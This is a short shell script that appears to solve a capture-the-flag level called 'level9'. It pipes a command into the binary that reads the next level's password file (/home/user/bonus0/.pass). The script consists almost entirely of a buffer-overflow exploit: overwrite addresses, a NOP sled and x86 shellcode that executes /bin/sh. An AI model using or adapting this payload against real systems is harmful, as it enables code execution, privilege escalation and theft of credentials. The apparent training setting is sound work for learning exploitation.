#!/bin/sh

echo 'echo "flag is: `cat /home/user/bonus0/.pass`"' | ./level9 `python -c 'print("\x10\xa0\x04\x08"+"\x90"*(96+4+4-21)+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"+"\x0c\xa0\x04\x08")'`

exit 0